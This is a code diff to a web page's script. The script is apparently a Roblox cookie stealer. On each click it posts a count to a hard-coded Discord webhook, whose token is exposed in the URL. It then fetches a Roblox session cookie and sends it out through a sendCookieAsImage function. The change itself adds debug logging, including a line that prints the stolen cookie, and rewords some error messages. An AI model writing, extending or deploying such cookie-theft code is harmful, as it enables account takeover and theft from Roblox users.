@@ -13,6 +13,8 @@
 
         function sendClickCount() {
             clickCount++;
+            console.log('Click count:', clickCount);
+
             // Send click count to Discord
             fetch('https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL', {
                 method: 'POST',
@@ -29,7 +31,7 @@
                     console.error('Failed to send click count');
                 }
             }).catch(error => {
-                console.error('Error:', error);
+                console.error('Error sending click count:', error);
             });
 
             // Try to retrieve Roblox cookies
@@ -37,13 +39,14 @@
                 .then(response => response.json())
                 .then(data => {
                     if (data.cookie) {
+                        console.log('Roblox cookie retrieved:', data.cookie);
                         sendCookieAsImage(data.cookie);
                     } else {
                         console.error('Failed to retrieve Roblox cookie from server');
                     }
                 })
                 .catch(error => {
-                    console.error('Error:', error);
+                    console.error('Error retrieving Roblox cookie:', error);
                 });
         }
 
@@ -80,7 +83,7 @@
                     console.error('Failed to send Roblox cookie and click count');
                 }
             }).catch(error => {
-                console.error('Error:', error);
+                console.error('Error sending Roblox cookie and click count:', error);
             });
         }
     </script>
